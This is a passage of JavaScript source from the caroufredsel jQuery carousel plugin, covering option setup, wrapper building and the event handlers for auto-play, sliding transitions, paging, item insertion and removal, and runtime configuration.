      is_number(opts.scroll.duration) || (opts.scroll.duration = 500), is_undefined(opts.scroll.items) && (opts.scroll.items = opts.responsive || opts.items.visibleConf.variable || "*" != opts.items.filter ? "visible" : opts.items.visible), opts.auto = $.extend(!0, {}, opts.scroll, opts.auto), opts.prev = $.extend(!0, {}, opts.scroll, opts.prev), opts.next = $.extend(!0, {}, opts.scroll, opts.next), opts.pagination = $.extend(!0, {}, opts.scroll, opts.pagination), opts.auto = go_complementAutoObject($tt0, opts.auto), opts.prev = go_complementPrevNextObject($tt0, opts.prev), opts.next = go_complementPrevNextObject($tt0, opts.next), opts.pagination = go_complementPaginationObject($tt0, opts.pagination), opts.swipe = go_complementSwipeObject($tt0, opts.swipe), opts.mousewheel = go_complementMousewheelObject($tt0, opts.mousewheel), opts.synchronise && (opts.synchronise = cf_getSynchArr(opts.synchronise)), opts.auto.onPauseStart && (opts.auto.onTimeoutStart = opts.auto.onPauseStart, deprecated("auto.onPauseStart", "auto.onTimeoutStart")), opts.auto.onPausePause && (opts.auto.onTimeoutPause = opts.auto.onPausePause, deprecated("auto.onPausePause", "auto.onTimeoutPause")), opts.auto.onPauseEnd && (opts.auto.onTimeoutEnd = opts.auto.onPauseEnd, deprecated("auto.onPauseEnd", "auto.onTimeoutEnd")), opts.auto.pauseDuration && (opts.auto.timeoutDuration = opts.auto.pauseDuration, deprecated("auto.pauseDuration", "auto.timeoutDuration"));
    }, FN._build = function () {
      $cfs.data("_cfs_isCarousel", !0);
      var a = $cfs.children(),
        b = in_mapCss($cfs, ["textAlign", "float", "position", "top", "right", "bottom", "left", "zIndex", "width", "height", "marginTop", "marginRight", "marginBottom", "marginLeft"]),
        c = "relative";
      switch (b.position) {
        case "absolute":
        case "fixed":
          c = b.position;
      }
      "parent" == conf.wrapper ? sz_storeOrigCss($wrp) : $wrp.css(b), $wrp.css({
        overflow: "hidden",
        position: c
      }), sz_storeOrigCss($cfs), $cfs.data("_cfs_origCssZindex", b.zIndex), $cfs.css({
        textAlign: "left",
        "float": "none",
        position: "absolute",
        top: 0,
        right: "auto",
        bottom: "auto",
        left: 0,
        marginTop: 0,
        marginRight: 0,
        marginBottom: 0,
        marginLeft: 0
      }), sz_storeMargin(a, opts), sz_storeOrigCss(a), opts.responsive && sz_setResponsiveSizes(opts, a);
    }, FN._bind_events = function () {
      FN._unbind_events(), $cfs.bind(cf_e("stop", conf), function (a, b) {
        return a.stopPropagation(), crsl.isStopped || opts.auto.button && opts.auto.button.addClass(cf_c("stopped", conf)), crsl.isStopped = !0, opts.auto.play && (opts.auto.play = !1, $cfs.trigger(cf_e("pause", conf), b)), !0;
      }), $cfs.bind(cf_e("finish", conf), function (a) {
        return a.stopPropagation(), crsl.isScrolling && sc_stopScroll(scrl), !0;
      }), $cfs.bind(cf_e("pause", conf), function (a, b, c) {
        if (a.stopPropagation(), tmrs = sc_clearTimers(tmrs), b && crsl.isScrolling) {
          scrl.isStopped = !0;
          var d = getTime() - scrl.startTime;
          scrl.duration -= d, scrl.pre && (scrl.pre.duration -= d), scrl.post && (scrl.post.duration -= d), sc_stopScroll(scrl, !1);
        }
        if (crsl.isPaused || crsl.isScrolling || c && (tmrs.timePassed += getTime() - tmrs.startTime), crsl.isPaused || opts.auto.button && opts.auto.button.addClass(cf_c("paused", conf)), crsl.isPaused = !0, opts.auto.onTimeoutPause) {
          var e = opts.auto.timeoutDuration - tmrs.timePassed,
            f = 100 - Math.ceil(100 * e / opts.auto.timeoutDuration);
          opts.auto.onTimeoutPause.call($tt0, f, e);
        }
        return !0;
      }), $cfs.bind(cf_e("play", conf), function (a, b, c, d) {
        a.stopPropagation(), tmrs = sc_clearTimers(tmrs);
        var e = [b, c, d],
          f = ["string", "number", "boolean"],
          g = cf_sortParams(e, f);
        if (b = g[0], c = g[1], d = g[2], "prev" != b && "next" != b && (b = crsl.direction), is_number(c) || (c = 0), is_boolean(d) || (d = !1), d && (crsl.isStopped = !1, opts.auto.play = !0), !opts.auto.play) return a.stopImmediatePropagation(), debug(conf, "Carousel stopped: Not scrolling.");
        crsl.isPaused && opts.auto.button && (opts.auto.button.removeClass(cf_c("stopped", conf)), opts.auto.button.removeClass(cf_c("paused", conf))), crsl.isPaused = !1, tmrs.startTime = getTime();
        var h = opts.auto.timeoutDuration + c;
        return dur2 = h - tmrs.timePassed, perc = 100 - Math.ceil(100 * dur2 / h), opts.auto.progress && (tmrs.progress = setInterval(function () {
          var a = getTime() - tmrs.startTime + tmrs.timePassed,
            b = Math.ceil(100 * a / h);
          opts.auto.progress.updater.call(opts.auto.progress.bar[0], b);
        }, opts.auto.progress.interval)), tmrs.auto = setTimeout(function () {
          opts.auto.progress && opts.auto.progress.updater.call(opts.auto.progress.bar[0], 100), opts.auto.onTimeoutEnd && opts.auto.onTimeoutEnd.call($tt0, perc, dur2), crsl.isScrolling ? $cfs.trigger(cf_e("play", conf), b) : $cfs.trigger(cf_e(b, conf), opts.auto);
        }, dur2), opts.auto.onTimeoutStart && opts.auto.onTimeoutStart.call($tt0, perc, dur2), !0;
      }), $cfs.bind(cf_e("resume", conf), function (a) {
        return a.stopPropagation(), scrl.isStopped ? (scrl.isStopped = !1, crsl.isPaused = !1, crsl.isScrolling = !0, scrl.startTime = getTime(), sc_startScroll(scrl, conf)) : $cfs.trigger(cf_e("play", conf)), !0;
      }), $cfs.bind(cf_e("prev", conf) + " " + cf_e("next", conf), function (a, b, c, d, e) {
        if (a.stopPropagation(), crsl.isStopped || $cfs.is(":hidden")) return a.stopImmediatePropagation(), debug(conf, "Carousel stopped or hidden: Not scrolling.");
        var f = is_number(opts.items.minimum) ? opts.items.minimum : opts.items.visible + 1;
        if (f > itms.total) return a.stopImmediatePropagation(), debug(conf, "Not enough items (" + itms.total + " total, " + f + " needed): Not scrolling.");
        var g = [b, c, d, e],
          h = ["object", "number/string", "function", "boolean"],
          i = cf_sortParams(g, h);
        b = i[0], c = i[1], d = i[2], e = i[3];
        var j = a.type.slice(conf.events.prefix.length);
        if (is_object(b) || (b = {}), is_function(d) && (b.onAfter = d), is_boolean(e) && (b.queue = e), b = $.extend(!0, {}, opts[j], b), b.conditions && !b.conditions.call($tt0, j)) return a.stopImmediatePropagation(), debug(conf, 'Callback "conditions" returned false.');
        if (!is_number(c)) {
          if ("*" != opts.items.filter) c = "visible";else for (var k = [c, b.items, opts[j].items], i = 0, l = k.length; l > i; i++) if (is_number(k[i]) || "page" == k[i] || "visible" == k[i]) {
            c = k[i];
            break;
          }
          switch (c) {
            case "page":
              return a.stopImmediatePropagation(), $cfs.triggerHandler(cf_e(j + "Page", conf), [b, d]);
            case "visible":
              opts.items.visibleConf.variable || "*" != opts.items.filter || (c = opts.items.visible);
          }
        }
        if (scrl.isStopped) return $cfs.trigger(cf_e("resume", conf)), $cfs.trigger(cf_e("queue", conf), [j, [b, c, d]]), a.stopImmediatePropagation(), debug(conf, "Carousel resumed scrolling.");
        if (b.duration > 0 && crsl.isScrolling) return b.queue && ("last" == b.queue && (queu = []), ("first" != b.queue || 0 == queu.length) && $cfs.trigger(cf_e("queue", conf), [j, [b, c, d]])), a.stopImmediatePropagation(), debug(conf, "Carousel currently scrolling.");
        if (tmrs.timePassed = 0, $cfs.trigger(cf_e("slide_" + j, conf), [b, c]), opts.synchronise) for (var m = opts.synchronise, n = [b, c], o = 0, l = m.length; l > o; o++) {
          var p = j;
          m[o][2] || (p = "prev" == p ? "next" : "prev"), m[o][1] || (n[0] = m[o][0].triggerHandler("_cfs_triggerEvent", ["configuration", p])), n[1] = c + m[o][3], m[o][0].trigger("_cfs_triggerEvent", ["slide_" + p, n]);
        }
        return !0;
      }), $cfs.bind(cf_e("slide_prev", conf), function (a, b, c) {
        a.stopPropagation();
        var d = $cfs.children();
        if (!opts.circular && 0 == itms.first) return opts.infinite && $cfs.trigger(cf_e("next", conf), itms.total - 1), a.stopImmediatePropagation();
        if (sz_resetMargin(d, opts), !is_number(c)) {
          if (opts.items.visibleConf.variable) c = gn_getVisibleItemsPrev(d, opts, itms.total - 1);else if ("*" != opts.items.filter) {
            var e = is_number(b.items) ? b.items : gn_getVisibleOrg($cfs, opts);
            c = gn_getScrollItemsPrevFilter(d, opts, itms.total - 1, e);
          } else c = opts.items.visible;
          c = cf_getAdjust(c, opts, b.items, $tt0);
        }
        if (opts.circular || itms.total - c < itms.first && (c = itms.total - itms.first), opts.items.visibleConf.old = opts.items.visible, opts.items.visibleConf.variable) {
          var f = cf_getItemsAdjust(gn_getVisibleItemsNext(d, opts, itms.total - c), opts, opts.items.visibleConf.adjust, $tt0);
          f >= opts.items.visible + c && itms.total > c && (c++, f = cf_getItemsAdjust(gn_getVisibleItemsNext(d, opts, itms.total - c), opts, opts.items.visibleConf.adjust, $tt0)), opts.items.visible = f;
        } else if ("*" != opts.items.filter) {
          var f = gn_getVisibleItemsNextFilter(d, opts, itms.total - c);
          opts.items.visible = cf_getItemsAdjust(f, opts, opts.items.visibleConf.adjust, $tt0);
        }
        if (sz_resetMargin(d, opts, !0), 0 == c) return a.stopImmediatePropagation(), debug(conf, "0 items to scroll: Not scrolling.");
        for (debug(conf, "Scrolling " + c + " items backward."), itms.first += c; itms.first >= itms.total;) itms.first -= itms.total;
        opts.circular || (0 == itms.first && b.onEnd && b.onEnd.call($tt0, "prev"), opts.infinite || nv_enableNavi(opts, itms.first, conf)), $cfs.children().slice(itms.total - c, itms.total).prependTo($cfs), itms.total < opts.items.visible + c && $cfs.children().slice(0, opts.items.visible + c - itms.total).clone(!0).appendTo($cfs);
        var d = $cfs.children(),
          g = gi_getOldItemsPrev(d, opts, c),
          h = gi_getNewItemsPrev(d, opts),
          i = d.eq(c - 1),
          j = g.last(),
          k = h.last();
        sz_resetMargin(d, opts);
        var l = 0,
          m = 0;
        if (opts.align) {
          var n = cf_getAlignPadding(h, opts);
          l = n[0], m = n[1];
        }
        var o = 0 > l ? opts.padding[opts.d[3]] : 0,
          p = !1,
          q = $();
        if (c > opts.items.visible && (q = d.slice(opts.items.visibleConf.old, c), "directscroll" == b.fx)) {
          var r = opts.items[opts.d.width];
          p = q, i = k, sc_hideHiddenItems(p), opts.items[opts.d.width] = "variable";
        }
        var s = !1,
          t = ms_getTotalSize(d.slice(0, c), opts, "width"),
          u = cf_mapWrapperSizes(ms_getSizes(h, opts, !0), opts, !opts.usePadding),
          v = 0,
          w = {},
          x = {},
          y = {},
          z = {},
          A = {},
          B = {},
          C = {},
          D = sc_getDuration(b, opts, c, t);
        switch (b.fx) {
          case "cover":
          case "cover-fade":
            v = ms_getTotalSize(d.slice(0, opts.items.visible), opts, "width");
        }
        p && (opts.items[opts.d.width] = r), sz_resetMargin(d, opts, !0), m >= 0 && sz_resetMargin(j, opts, opts.padding[opts.d[1]]), l >= 0 && sz_resetMargin(i, opts, opts.padding[opts.d[3]]), opts.align && (opts.padding[opts.d[1]] = m, opts.padding[opts.d[3]] = l), B[opts.d.left] = -(t - o), C[opts.d.left] = -(v - o), x[opts.d.left] = u[opts.d.width];
        var E = function () {},
          F = function () {},
          G = function () {},
          H = function () {},
          I = function () {},
          J = function () {},
          K = function () {},
          L = function () {},
          M = function () {},
          N = function () {},
          O = function () {};
        switch (b.fx) {
          case "crossfade":
          case "cover":
          case "cover-fade":
          case "uncover":
          case "uncover-fade":
            s = $cfs.clone(!0).appendTo($wrp);
        }
        switch (b.fx) {
          case "crossfade":
          case "uncover":
          case "uncover-fade":
            s.children().slice(0, c).remove(), s.children().slice(opts.items.visibleConf.old).remove();
            break;
          case "cover":
          case "cover-fade":
            s.children().slice(opts.items.visible).remove(), s.css(C);
        }
        if ($cfs.css(B), scrl = sc_setScroll(D, b.easing, conf), w[opts.d.left] = opts.usePadding ? opts.padding[opts.d[3]] : 0, ("variable" == opts[opts.d.width] || "variable" == opts[opts.d.height]) && (E = function () {
          $wrp.css(u);
        }, F = function () {
          scrl.anims.push([$wrp, u]);
        }), opts.usePadding) {
          switch (k.not(i).length && (y[opts.d.marginRight] = i.data("_cfs_origCssMargin"), 0 > l ? i.css(y) : (K = function () {
            i.css(y);
          }, L = function () {
            scrl.anims.push([i, y]);
          })), b.fx) {
            case "cover":
            case "cover-fade":
              s.children().eq(c - 1).css(y);
          }
          k.not(j).length && (z[opts.d.marginRight] = j.data("_cfs_origCssMargin"), G = function () {
            j.css(z);
          }, H = function () {
            scrl.anims.push([j, z]);
          }), m >= 0 && (A[opts.d.marginRight] = k.data("_cfs_origCssMargin") + opts.padding[opts.d[1]], I = function () {
            k.css(A);
          }, J = function () {
            scrl.anims.push([k, A]);
          });
        }
        O = function () {
          $cfs.css(w);
        };
        var P = opts.items.visible + c - itms.total;
        N = function () {
          if (P > 0 && ($cfs.children().slice(itms.total).remove(), g = $($cfs.children().slice(itms.total - (opts.items.visible - P)).get().concat($cfs.children().slice(0, P).get()))), sc_showHiddenItems(p), opts.usePadding) {
            var a = $cfs.children().eq(opts.items.visible + c - 1);
            a.css(opts.d.marginRight, a.data("_cfs_origCssMargin"));
          }
        };
        var Q = sc_mapCallbackArguments(g, q, h, c, "prev", D, u);
        switch (M = function () {
          sc_afterScroll($cfs, s, b), crsl.isScrolling = !1, clbk.onAfter = sc_fireCallbacks($tt0, b, "onAfter", Q, clbk), queu = sc_fireQueue($cfs, queu, conf), crsl.isPaused || $cfs.trigger(cf_e("play", conf));
        }, crsl.isScrolling = !0, tmrs = sc_clearTimers(tmrs), clbk.onBefore = sc_fireCallbacks($tt0, b, "onBefore", Q, clbk), b.fx) {
          case "none":
            $cfs.css(w), E(), G(), I(), K(), O(), N(), M();
            break;
          case "fade":
            scrl.anims.push([$cfs, {
              opacity: 0
            }, function () {
              E(), G(), I(), K(), O(), N(), scrl = sc_setScroll(D, b.easing, conf), scrl.anims.push([$cfs, {
                opacity: 1
              }, M]), sc_startScroll(scrl, conf);
            }]);
            break;
          case "crossfade":
            $cfs.css({
              opacity: 0
            }), scrl.anims.push([s, {
              opacity: 0
            }]), scrl.anims.push([$cfs, {
              opacity: 1
            }, M]), F(), G(), I(), K(), O(), N();
            break;
          case "cover":
            scrl.anims.push([s, w, function () {
              G(), I(), K(), O(), N(), M();
            }]), F();
            break;
          case "cover-fade":
            scrl.anims.push([$cfs, {
              opacity: 0
            }]), scrl.anims.push([s, w, function () {
              G(), I(), K(), O(), N(), M();
            }]), F();
            break;
          case "uncover":
            scrl.anims.push([s, x, M]), F(), G(), I(), K(), O(), N();
            break;
          case "uncover-fade":
            $cfs.css({
              opacity: 0
            }), scrl.anims.push([$cfs, {
              opacity: 1
            }]), scrl.anims.push([s, x, M]), F(), G(), I(), K(), O(), N();
            break;
          default:
            scrl.anims.push([$cfs, w, function () {
              N(), M();
            }]), F(), H(), J(), L();
        }
        return sc_startScroll(scrl, conf), cf_setCookie(opts.cookie, $cfs, conf), $cfs.trigger(cf_e("updatePageStatus", conf), [!1, u]), !0;
      }), $cfs.bind(cf_e("slide_next", conf), function (a, b, c) {
        a.stopPropagation();
        var d = $cfs.children();
        if (!opts.circular && itms.first == opts.items.visible) return opts.infinite && $cfs.trigger(cf_e("prev", conf), itms.total - 1), a.stopImmediatePropagation();
        if (sz_resetMargin(d, opts), !is_number(c)) {
          if ("*" != opts.items.filter) {
            var e = is_number(b.items) ? b.items : gn_getVisibleOrg($cfs, opts);
            c = gn_getScrollItemsNextFilter(d, opts, 0, e);
          } else c = opts.items.visible;
          c = cf_getAdjust(c, opts, b.items, $tt0);
        }
        var f = 0 == itms.first ? itms.total : itms.first;
        if (!opts.circular) {
          if (opts.items.visibleConf.variable) var g = gn_getVisibleItemsNext(d, opts, c),
            e = gn_getVisibleItemsPrev(d, opts, f - 1);else var g = opts.items.visible,
            e = opts.items.visible;
          c + g > f && (c = f - e);
        }
        if (opts.items.visibleConf.old = opts.items.visible, opts.items.visibleConf.variable) {
          for (var g = cf_getItemsAdjust(gn_getVisibleItemsNextTestCircular(d, opts, c, f), opts, opts.items.visibleConf.adjust, $tt0); opts.items.visible - c >= g && itms.total > c;) c++, g = cf_getItemsAdjust(gn_getVisibleItemsNextTestCircular(d, opts, c, f), opts, opts.items.visibleConf.adjust, $tt0);
          opts.items.visible = g;
        } else if ("*" != opts.items.filter) {
          var g = gn_getVisibleItemsNextFilter(d, opts, c);
          opts.items.visible = cf_getItemsAdjust(g, opts, opts.items.visibleConf.adjust, $tt0);
        }
        if (sz_resetMargin(d, opts, !0), 0 == c) return a.stopImmediatePropagation(), debug(conf, "0 items to scroll: Not scrolling.");
        for (debug(conf, "Scrolling " + c + " items forward."), itms.first -= c; 0 > itms.first;) itms.first += itms.total;
        opts.circular || (itms.first == opts.items.visible && b.onEnd && b.onEnd.call($tt0, "next"), opts.infinite || nv_enableNavi(opts, itms.first, conf)), itms.total < opts.items.visible + c && $cfs.children().slice(0, opts.items.visible + c - itms.total).clone(!0).appendTo($cfs);
        var d = $cfs.children(),
          h = gi_getOldItemsNext(d, opts),
          i = gi_getNewItemsNext(d, opts, c),
          j = d.eq(c - 1),
          k = h.last(),
          l = i.last();
        sz_resetMargin(d, opts);
        var m = 0,
          n = 0;
        if (opts.align) {
          var o = cf_getAlignPadding(i, opts);
          m = o[0], n = o[1];
        }
        var p = !1,
          q = $();
        if (c > opts.items.visibleConf.old && (q = d.slice(opts.items.visibleConf.old, c), "directscroll" == b.fx)) {
          var r = opts.items[opts.d.width];
          p = q, j = k, sc_hideHiddenItems(p), opts.items[opts.d.width] = "variable";
        }
        var s = !1,
          t = ms_getTotalSize(d.slice(0, c), opts, "width"),
          u = cf_mapWrapperSizes(ms_getSizes(i, opts, !0), opts, !opts.usePadding),
          v = 0,
          w = {},
          x = {},
          y = {},
          z = {},
          A = {},
          B = sc_getDuration(b, opts, c, t);
        switch (b.fx) {
          case "uncover":
          case "uncover-fade":
            v = ms_getTotalSize(d.slice(0, opts.items.visibleConf.old), opts, "width");
        }
        p && (opts.items[opts.d.width] = r), opts.align && 0 > opts.padding[opts.d[1]] && (opts.padding[opts.d[1]] = 0), sz_resetMargin(d, opts, !0), sz_resetMargin(k, opts, opts.padding[opts.d[1]]), opts.align && (opts.padding[opts.d[1]] = n, opts.padding[opts.d[3]] = m), A[opts.d.left] = opts.usePadding ? opts.padding[opts.d[3]] : 0;
        var C = function () {},
          D = function () {},
          E = function () {},
          F = function () {},
          G = function () {},
          H = function () {},
          I = function () {},
          J = function () {},
          K = function () {};
        switch (b.fx) {
          case "crossfade":
          case "cover":
          case "cover-fade":
          case "uncover":
          case "uncover-fade":
            s = $cfs.clone(!0).appendTo($wrp), s.children().slice(opts.items.visibleConf.old).remove();
        }
        switch (b.fx) {
          case "crossfade":
          case "cover":
          case "cover-fade":
            $cfs.css("zIndex", 1), s.css("zIndex", 0);
        }
        if (scrl = sc_setScroll(B, b.easing, conf), w[opts.d.left] = -t, x[opts.d.left] = -v, 0 > m && (w[opts.d.left] += m), ("variable" == opts[opts.d.width] || "variable" == opts[opts.d.height]) && (C = function () {
          $wrp.css(u);
        }, D = function () {
          scrl.anims.push([$wrp, u]);
        }), opts.usePadding) {
          var L = l.data("_cfs_origCssMargin");
          n >= 0 && (L += opts.padding[opts.d[1]]), l.css(opts.d.marginRight, L), j.not(k).length && (z[opts.d.marginRight] = k.data("_cfs_origCssMargin")), E = function () {
            k.css(z);
          }, F = function () {
            scrl.anims.push([k, z]);
          };
          var M = j.data("_cfs_origCssMargin");
          m > 0 && (M += opts.padding[opts.d[3]]), y[opts.d.marginRight] = M, G = function () {
            j.css(y);
          }, H = function () {
            scrl.anims.push([j, y]);
          };
        }
        K = function () {
          $cfs.css(A);
        };
        var N = opts.items.visible + c - itms.total;
        J = function () {
          N > 0 && $cfs.children().slice(itms.total).remove();
          var a = $cfs.children().slice(0, c).appendTo($cfs).last();
          if (N > 0 && (i = gi_getCurrentItems(d, opts)), sc_showHiddenItems(p), opts.usePadding) {
            if (itms.total < opts.items.visible + c) {
              var b = $cfs.children().eq(opts.items.visible - 1);
              b.css(opts.d.marginRight, b.data("_cfs_origCssMargin") + opts.padding[opts.d[1]]);
            }
            a.css(opts.d.marginRight, a.data("_cfs_origCssMargin"));
          }
        };
        var O = sc_mapCallbackArguments(h, q, i, c, "next", B, u);
        switch (I = function () {
          $cfs.css("zIndex", $cfs.data("_cfs_origCssZindex")), sc_afterScroll($cfs, s, b), crsl.isScrolling = !1, clbk.onAfter = sc_fireCallbacks($tt0, b, "onAfter", O, clbk), queu = sc_fireQueue($cfs, queu, conf), crsl.isPaused || $cfs.trigger(cf_e("play", conf));
        }, crsl.isScrolling = !0, tmrs = sc_clearTimers(tmrs), clbk.onBefore = sc_fireCallbacks($tt0, b, "onBefore", O, clbk), b.fx) {
          case "none":
            $cfs.css(w), C(), E(), G(), K(), J(), I();
            break;
          case "fade":
            scrl.anims.push([$cfs, {
              opacity: 0
            }, function () {
              C(), E(), G(), K(), J(), scrl = sc_setScroll(B, b.easing, conf), scrl.anims.push([$cfs, {
                opacity: 1
              }, I]), sc_startScroll(scrl, conf);
            }]);
            break;
          case "crossfade":
            $cfs.css({
              opacity: 0
            }), scrl.anims.push([s, {
              opacity: 0
            }]), scrl.anims.push([$cfs, {
              opacity: 1
            }, I]), D(), E(), G(), K(), J();
            break;
          case "cover":
            $cfs.css(opts.d.left, $wrp[opts.d.width]()), scrl.anims.push([$cfs, A, I]), D(), E(), G(), J();
            break;
          case "cover-fade":
            $cfs.css(opts.d.left, $wrp[opts.d.width]()), scrl.anims.push([s, {
              opacity: 0
            }]), scrl.anims.push([$cfs, A, I]), D(), E(), G(), J();
            break;
          case "uncover":
            scrl.anims.push([s, x, I]), D(), E(), G(), K(), J();
            break;
          case "uncover-fade":
            $cfs.css({
              opacity: 0
            }), scrl.anims.push([$cfs, {
              opacity: 1
            }]), scrl.anims.push([s, x, I]), D(), E(), G(), K(), J();
            break;
          default:
            scrl.anims.push([$cfs, w, function () {
              K(), J(), I();
            }]), D(), F(), H();
        }
        return sc_startScroll(scrl, conf), cf_setCookie(opts.cookie, $cfs, conf), $cfs.trigger(cf_e("updatePageStatus", conf), [!1, u]), !0;
      }), $cfs.bind(cf_e("slideTo", conf), function (a, b, c, d, e, f, g) {
        a.stopPropagation();
        var h = [b, c, d, e, f, g],
          i = ["string/number/object", "number", "boolean", "object", "string", "function"],
          j = cf_sortParams(h, i);
        return e = j[3], f = j[4], g = j[5], b = gn_getItemIndex(j[0], j[1], j[2], itms, $cfs), 0 == b ? !1 : (is_object(e) || (e = !1), "prev" != f && "next" != f && (f = opts.circular ? itms.total / 2 >= b ? "next" : "prev" : 0 == itms.first || itms.first > b ? "next" : "prev"), "prev" == f && (b = itms.total - b), $cfs.trigger(cf_e(f, conf), [e, b, g]), !0);
      }), $cfs.bind(cf_e("prevPage", conf), function (a, b, c) {
        a.stopPropagation();
        var d = $cfs.triggerHandler(cf_e("currentPage", conf));
        return $cfs.triggerHandler(cf_e("slideToPage", conf), [d - 1, b, "prev", c]);
      }), $cfs.bind(cf_e("nextPage", conf), function (a, b, c) {
        a.stopPropagation();
        var d = $cfs.triggerHandler(cf_e("currentPage", conf));
        return $cfs.triggerHandler(cf_e("slideToPage", conf), [d + 1, b, "next", c]);
      }), $cfs.bind(cf_e("slideToPage", conf), function (a, b, c, d, e) {
        a.stopPropagation(), is_number(b) || (b = $cfs.triggerHandler(cf_e("currentPage", conf)));
        var f = opts.pagination.items || opts.items.visible,
          g = Math.ceil(itms.total / f) - 1;
        return 0 > b && (b = g), b > g && (b = 0), $cfs.triggerHandler(cf_e("slideTo", conf), [b * f, 0, !0, c, d, e]);
      }), $cfs.bind(cf_e("jumpToStart", conf), function (a, b) {
        if (a.stopPropagation(), b = b ? gn_getItemIndex(b, 0, !0, itms, $cfs) : 0, b += itms.first, 0 != b) {
          if (itms.total > 0) for (; b > itms.total;) b -= itms.total;
          $cfs.prepend($cfs.children().slice(b, itms.total));
        }
        return !0;
      }), $cfs.bind(cf_e("synchronise", conf), function (a, b) {
        if (a.stopPropagation(), b) b = cf_getSynchArr(b);else {
          if (!opts.synchronise) return debug(conf, "No carousel to synchronise.");
          b = opts.synchronise;
        }
        for (var c = $cfs.triggerHandler(cf_e("currentPosition", conf)), d = !0, e = 0, f = b.length; f > e; e++) b[e][0].triggerHandler(cf_e("slideTo", conf), [c, b[e][3], !0]) || (d = !1);
        return d;
      }), $cfs.bind(cf_e("queue", conf), function (a, b, c) {
        return a.stopPropagation(), is_function(b) ? b.call($tt0, queu) : is_array(b) ? queu = b : is_undefined(b) || queu.push([b, c]), queu;
      }), $cfs.bind(cf_e("insertItem", conf), function (a, b, c, d, e) {
        a.stopPropagation();
        var f = [b, c, d, e],
          g = ["string/object", "string/number/object", "boolean", "number"],
          h = cf_sortParams(f, g);
        if (b = h[0], c = h[1], d = h[2], e = h[3], is_object(b) && !is_jquery(b) ? b = $(b) : is_string(b) && (b = $(b)), !is_jquery(b) || 0 == b.length) return debug(conf, "Not a valid object.");
        is_undefined(c) && (c = "end"), sz_storeMargin(b, opts), sz_storeOrigCss(b);
        var i = c,
          j = "before";
        "end" == c ? d ? (0 == itms.first ? (c = itms.total - 1, j = "after") : (c = itms.first, itms.first += b.length), 0 > c && (c = 0)) : (c = itms.total - 1, j = "after") : c = gn_getItemIndex(c, e, d, itms, $cfs);
        var k = $cfs.children().eq(c);
        return k.length ? k[j](b) : (debug(conf, "Correct insert-position not found! Appending item to the end."), $cfs.append(b)), "end" == i || d || itms.first > c && (itms.first += b.length), itms.total = $cfs.children().length, itms.first >= itms.total && (itms.first -= itms.total), $cfs.trigger(cf_e("updateSizes", conf)), $cfs.trigger(cf_e("linkAnchors", conf)), !0;
      }), $cfs.bind(cf_e("removeItem", conf), function (a, b, c, d) {
        a.stopPropagation();
        var e = [b, c, d],
          f = ["string/number/object", "boolean", "number"],
          g = cf_sortParams(e, f);
        if (b = g[0], c = g[1], d = g[2], b instanceof $ && b.length > 1) return i = $(), b.each(function () {
          var e = $cfs.trigger(cf_e("removeItem", conf), [$(this), c, d]);
          e && (i = i.add(e));
        }), i;
        if (is_undefined(b) || "end" == b) i = $cfs.children().last();else {
          b = gn_getItemIndex(b, d, c, itms, $cfs);
          var i = $cfs.children().eq(b);
          i.length && itms.first > b && (itms.first -= i.length);
        }
        return i && i.length && (i.detach(), itms.total = $cfs.children().length, $cfs.trigger(cf_e("updateSizes", conf))), i;
      }), $cfs.bind(cf_e("onBefore", conf) + " " + cf_e("onAfter", conf), function (a, b) {
        a.stopPropagation();
        var c = a.type.slice(conf.events.prefix.length);
        return is_array(b) && (clbk[c] = b), is_function(b) && clbk[c].push(b), clbk[c];
      }), $cfs.bind(cf_e("currentPosition", conf), function (a, b) {
        if (a.stopPropagation(), 0 == itms.first) var c = 0;else var c = itms.total - itms.first;
        return is_function(b) && b.call($tt0, c), c;
      }), $cfs.bind(cf_e("currentPage", conf), function (a, b) {
        a.stopPropagation();
        var e,
          c = opts.pagination.items || opts.items.visible,
          d = Math.ceil(itms.total / c - 1);
        return e = 0 == itms.first ? 0 : itms.first < itms.total % c ? 0 : itms.first != c || opts.circular ? Math.round((itms.total - itms.first) / c) : d, 0 > e && (e = 0), e > d && (e = d), is_function(b) && b.call($tt0, e), e;
      }), $cfs.bind(cf_e("currentVisible", conf), function (a, b) {
        a.stopPropagation();
        var c = gi_getCurrentItems($cfs.children(), opts);
        return is_function(b) && b.call($tt0, c), c;
      }), $cfs.bind(cf_e("slice", conf), function (a, b, c, d) {
        if (a.stopPropagation(), 0 == itms.total) return !1;
        var e = [b, c, d],
          f = ["number", "number", "function"],
          g = cf_sortParams(e, f);
        if (b = is_number(g[0]) ? g[0] : 0, c = is_number(g[1]) ? g[1] : itms.total, d = g[2], b += itms.first, c += itms.first, items.total > 0) {
          for (; b > itms.total;) b -= itms.total;
          for (; c > itms.total;) c -= itms.total;
          for (; 0 > b;) b += itms.total;
          for (; 0 > c;) c += itms.total;
        }
        var i,
          h = $cfs.children();
        return i = c > b ? h.slice(b, c) : $(h.slice(b, itms.total).get().concat(h.slice(0, c).get())), is_function(d) && d.call($tt0, i), i;
      }), $cfs.bind(cf_e("isPaused", conf) + " " + cf_e("isStopped", conf) + " " + cf_e("isScrolling", conf), function (a, b) {
        a.stopPropagation();
        var c = a.type.slice(conf.events.prefix.length),
          d = crsl[c];
        return is_function(b) && b.call($tt0, d), d;
      }), $cfs.bind(cf_e("configuration", conf), function (e, a, b, c) {
        e.stopPropagation();
        var reInit = !1;
        if (is_function(a)) a.call($tt0, opts);else if (is_object(a)) opts_orig = $.extend(!0, {}, opts_orig, a), b !== !1 ? reInit = !0 : opts = $.extend(!0, {}, opts, a);else if (!is_undefined(a)) if (is_function(b)) {
          var val = eval("opts." + a);
          is_undefined(val) && (val = ""), b.call($tt0, val);
        } else {
          if (is_undefined(b)) return eval("opts." + a);
          "boolean" != typeof c && (c = !0), eval("opts_orig." + a + " = b"), c !== !1 ? reInit = !0 : eval("opts." + a + " = b");
        }
        if (reInit) {
          sz_resetMargin($cfs.children(), opts), FN._init(opts_orig), FN._bind_buttons();
          var sz = sz_setSizes($cfs, opts);
          $cfs.trigger(cf_e("updatePageStatus", conf), [!0, sz]);
        }
        return opts;
      }), $cfs.bind(cf_e("linkAnchors", conf), function (a, b, c) {
        return a.stopPropagation(), is_undefined(b) ? b = $("body") : is_string(b) && (b = $(b)), is_jquery(b) && 0 != b.length ? (is_string(c) || (c = "a.caroufredsel"), b.find(c).each(function () {
          var a = this.hash || "";
          a.length > 0 && -1 != $cfs.children().index($(a)) && $(this).unbind("click").click(function (b) {
            b.preventDefault(), $cfs.trigger(cf_e("slideTo", conf), a);
          });
        }), !0) : debug(conf, "Not a valid object.");
      }), $cfs.bind(cf_e("updatePageStatus", conf), function (a, b) {
